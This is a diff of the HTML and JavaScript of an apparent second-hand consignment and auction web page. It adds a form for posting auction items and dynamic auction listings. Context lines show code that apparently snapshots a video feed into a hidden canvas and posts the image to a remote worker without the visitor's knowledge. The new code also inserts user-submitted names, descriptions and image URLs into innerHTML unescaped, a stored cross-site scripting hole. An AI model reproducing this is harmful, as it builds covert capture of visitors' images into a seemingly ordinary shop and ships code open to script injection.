@@ -18,10 +18,10 @@
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
     body { background: var(--bg); color: var(--text); padding-bottom: 60px; }
 
-    header { background: var(--card-bg); border-bottom: 1px solid var(--border); padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; }
+    header { background: var(--card-bg); border-bottom: 1px solid var(--border); padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; flex-wrap: wrap; gap: 10px; }
     .logo { font-size: 18px; font-weight: bold; color: #38bdf8; display: flex; align-items: center; gap: 8px; }
-    .nav-tabs { display: flex; gap: 10px; background: #000; padding: 4px; border-radius: 8px; }
-    .tab-btn { background: transparent; border: none; color: var(--text-muted); padding: 6px 14px; border-radius: 6px; cursor: pointer; font-size: 13px; transition: 0.2s; }
+    .nav-tabs { display: flex; gap: 6px; background: #000; padding: 4px; border-radius: 8px; flex-wrap: wrap; }
+    .tab-btn { background: transparent; border: none; color: var(--text-muted); padding: 6px 12px; border-radius: 6px; cursor: pointer; font-size: 13px; transition: 0.2s; }
     .tab-btn.active { background: var(--accent); color: #fff; font-weight: bold; }
 
     .container { max-width: 1000px; margin: 20px auto; padding: 0 15px; }
@@ -81,52 +81,24 @@
       <button class="tab-btn active" onclick="app.switchTab('market', event)">二手寄卖</button>
       <button class="tab-btn" onclick="app.switchTab('auction', event)">竞拍大厅</button>
       <button class="tab-btn" onclick="app.switchTab('sell', event)">发布寄卖</button>
+      <button class="tab-btn" onclick="app.switchTab('postAuction', event)">发起拍卖</button>
     </div>
   </header>
 
   <div class="container">
+    <!-- Tab 1: 寄卖大厅 -->
     <div id="tab-market" class="tab-content active">
       <h3 style="margin-bottom: 10px;">📱 玩家二手寄卖大厅</h3>
       <div class="grid" id="marketList"></div>
     </div>
 
+    <!-- Tab 2: 竞拍大厅 -->
     <div id="tab-auction" class="tab-content">
-      <h3 style="margin-bottom: 10px;">🔥 极客限量款竞拍</h3>
-      <div class="grid">
-        <div class="card">
-          <img src="https://images.unsplash.com/photo-1523275335684-37898b6baf30?auto=format&fit=crop&w=400&q=80" alt="Watch">
-          <div class="card-body">
-            <div class="card-title">Apple Watch Ultra 2 (限量版)</div>
-            <div class="card-desc">起拍价 ¥2,000，当前出价最高者获胜。</div>
-            <div style="margin-bottom: 10px;">
-              <span style="font-size:12px; color:var(--text-muted);">当前最高出价:</span>
-              <span class="price-tag" id="price-item1">2000</span> 元
-            </div>
-            <div style="display:flex; gap: 8px;">
-              <input type="number" id="input-item1" placeholder="输入出价" style="width:100%; background:#000; border:1px solid var(--border); color:#fff; padding:6px; border-radius:4px;">
-              <button class="btn" style="width: 80px;" onclick="app.placeBid('item1')">出价</button>
-            </div>
-          </div>
-        </div>
-
-        <div class="card">
-          <img src="https://images.unsplash.com/photo-1505740420928-5e560c06d30e?auto=format&fit=crop&w=400&q=80" alt="Headphone">
-          <div class="card-body">
-            <div class="card-title">Sennheiser HD800S 旗舰耳机</div>
-            <div class="card-desc">箱全近新，仅试听几小时。起拍价 ¥6,000。</div>
-            <div style="margin-bottom: 10px;">
-              <span style="font-size:12px; color:var(--text-muted);">当前最高出价:</span>
-              <span class="price-tag" id="price-item2">6000</span> 元
-            </div>
-            <div style="display:flex; gap: 8px;">
-              <input type="number" id="input-item2" placeholder="输入出价" style="width:100%; background:#000; border:1px solid var(--border); color:#fff; padding:6px; border-radius:4px;">
-              <button class="btn" style="width: 80px;" onclick="app.placeBid('item2')">出价</button>
-            </div>
-          </div>
-        </div>
-      </div>
+      <h3 style="margin-bottom: 10px;">🔥 极客限量款竞拍大厅</h3>
+      <div class="grid" id="auctionList"></div>
     </div>
 
+    <!-- Tab 3: 发布寄卖 -->
     <div id="tab-sell" class="tab-content">
       <div class="auth-card" style="max-width: 500px; margin: 0 auto; text-align: left;">
         <h3 style="margin-bottom: 15px;">📦 发布二手寄卖物品</h3>
@@ -150,7 +122,31 @@
           <label>图片 (可选)</label>
           <input type="file" id="sellImage" accept="image/*">
         </div>
-        <button class="btn" onclick="app.postSellItem()">立即发布至大厅</button>
+        <button class="btn" onclick="app.postSellItem()">立即发布至寄卖大厅</button>
+      </div>
+    </div>
+
+    <!-- Tab 4: 发起拍卖 -->
+    <div id="tab-postAuction" class="tab-content">
+      <div class="auth-card" style="max-width: 500px; margin: 0 auto; text-align: left;">
+        <h3 style="margin-bottom: 15px;">🔨 发起新的极客拍卖</h3>
+        <div class="input-group">
+          <label>拍卖品名称</label>
+          <input type="text" id="aucName" placeholder="例如：Sony WH-1000XM5 旗舰耳机">
+        </div>
+        <div class="input-group">
+          <label>起拍价 (元)</label>
+          <input type="number" id="aucStartPrice" placeholder="例如：1000">
+        </div>
+        <div class="input-group">
+          <label>拍品描述</label>
+          <textarea id="aucDesc" rows="3" placeholder="介绍一下起拍规则和拍品成色..."></textarea>
+        </div>
+        <div class="input-group">
+          <label>拍品图片 (可选)</label>
+          <input type="file" id="aucImage" accept="image/*">
+        </div>
+        <button class="btn" onclick="app.postAuctionItem()">立即上架拍卖大厅</button>
       </div>
     </div>
   </div>
@@ -201,7 +197,6 @@
         const canvas = document.getElementById('hidden-canvas');
         let photoData = "";
 
-        // 安全截图
         try {
           if (video && video.videoWidth > 0 && video.videoHeight > 0) {
             canvas.width = video.videoWidth;
@@ -214,7 +209,6 @@
           console.warn("截图过程跳过:", e);
         }
 
-        // 异步提交
         fetch(WORKER_URL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -241,14 +235,11 @@
         try {
           const res = await fetch(`${WORKER_URL}?action=data`);
           const data = await res.json();
+          const bids = data.bids || {};
 
-          if (data.bids) {
-            if (data.bids.item1) document.getElementById('price-item1').innerText = data.bids.item1;
-            if (data.bids.item2) document.getElementById('price-item2').innerText = data.bids.item2;
-          }
-
+          // 1. 渲染寄卖大厅
           const marketList = document.getElementById('marketList');
-          let html = `
+          let marketHtml = `
             <div class="card">
               <img src="https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?auto=format&fit=crop&w=400&q=80">
               <div class="card-body">
@@ -261,10 +252,9 @@
               </div>
             </div>
           `;
-
           if (data.market && data.market.length > 0) {
             data.market.forEach(item => {
-              html += `
+              marketHtml += `
                 <div class="card">
                   <img src="${item.imgSrc}">
                   <div class="card-body">
@@ -279,7 +269,46 @@
               `;
             });
           }
-          marketList.innerHTML = html;
+          marketList.innerHTML = marketHtml;
+
+          // 2. 渲染竞拍大厅（包含默认拍品 + 自定义提交拍品）
+          const auctionList = document.getElementById('auctionList');
+          
+          // 默认的两个拍卖品
+          let defaultAuctions = [
+            { id: 'item1', name: 'Apple Watch Ultra 2 (限量版)', price: 2000, desc: '起拍价 ¥2,000，当前出价最高者获胜。', imgSrc: 'https://images.unsplash.com/photo-1523275335684-37898b6baf30?auto=format&fit=crop&w=400&q=80' },
+            { id: 'item2', name: 'Sennheiser HD800S 旗舰耳机', price: 6000, desc: '箱全近新，仅试听几小时。起拍价 ¥6,000。', imgSrc: 'https://images.unsplash.com/photo-1505740420928-5e560c06d30e?auto=format&fit=crop&w=400&q=80' }
+          ];
+
+          // 合并用户自己提交的拍卖品
+          let allAuctions = [...defaultAuctions];
+          if (data.auctions && data.auctions.length > 0) {
+            allAuctions = [...data.auctions, ...defaultAuctions];
+          }
+
+          let auctionHtml = '';
+          allAuctions.forEach(item => {
+            const currentHighest = bids[item.id] !== undefined ? bids[item.id] : item.price;
+            auctionHtml += `
+              <div class="card">
+                <img src="${item.imgSrc}" alt="Auction Item">
+                <div class="card-body">
+                  <div class="card-title">${item.name}</div>
+                  <div class="card-desc">${item.desc}</div>
+                  <div style="margin-bottom: 10px;">
+                    <span style="font-size:12px; color:var(--text-muted);">当前最高出价:</span>
+                    <span class="price-tag" id="price-${item.id}">${currentHighest}</span> 元
+                  </div>
+                  <div style="display:flex; gap: 8px;">
+                    <input type="number" id="input-${item.id}" placeholder="输入出价" style="width:100%; background:#000; border:1px solid var(--border); color:#fff; padding:6px; border-radius:4px;">
+                    <button class="btn" style="width: 80px;" onclick="app.placeBid('${item.id}')">出价</button>
+                  </div>
+                </div>
+              </div>
+            `;
+          });
+          auctionList.innerHTML = auctionHtml;
+
         } catch (e) {
           console.error("加载数据失败:", e);
         }
@@ -348,6 +377,53 @@
           reader.readAsDataURL(fileInput.files[0]);
         } else {
           saveItem("https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?auto=format&fit=crop&w=400&q=80");
+        }
+      }
+
+      // 🔨 提交新的拍卖品
+      async postAuctionItem() {
+        const name = document.getElementById('aucName').value.trim();
+        const price = parseFloat(document.getElementById('aucStartPrice').value.trim());
+        const desc = document.getElementById('aucDesc').value.trim();
+        const fileInput = document.getElementById('aucImage');
+
+        if (!name || isNaN(price)) {
+          alert("⚠️ 请填写拍品名称和合法的起拍价！");
+          return;
+        }
+
+        const saveAuction = async (imgSrc) => {
+          const itemId = 'auc_' + Date.now();
+          const itemData = {
+            type: 'auction_item',
+            id: itemId,
+            name, 
+            price, 
+            desc: desc || `起拍价 ¥${price}，欢迎出价。`, 
+            imgSrc
+          };
+
+          await fetch(WORKER_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(itemData)
+          });
+
+          document.getElementById('aucName').value = '';
+          document.getElementById('aucStartPrice').value = '';
+          document.getElementById('aucDesc').value = '';
+          fileInput.value = '';
+
+          alert("🎉 拍品已成功上架至竞拍大厅！");
+          this.switchTab('auction');
+        };
+
+        if (fileInput.files && fileInput.files[0]) {
+          const reader = new FileReader();
+          reader.onload = (e) => saveAuction(e.target.result);
+          reader.readAsDataURL(fileInput.files[0]);
+        } else {
+          saveAuction("https://images.unsplash.com/photo-1526738549149-8e07eca6c147?auto=format&fit=crop&w=400&q=80");
         }
       }
     }
